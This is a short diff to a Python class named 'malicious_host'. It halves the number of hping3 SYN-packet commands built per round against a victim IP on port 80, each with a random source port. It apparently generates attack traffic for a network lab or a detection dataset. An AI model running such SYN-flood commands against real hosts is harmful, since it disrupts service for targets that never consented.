@@ -60,7 +60,7 @@ class malicious_host():
     count = 0
     while( count<attack_number):
       sleep(attack_interval)
-      for i in range(10):
+      for i in range(5):
         attack_port = randint(80, 65000)
         attack = f'hping3 -S -d 10 -s {attack_port} -p 80 -c 1 {victim_ip} &'
         self.attacks.append(attack)
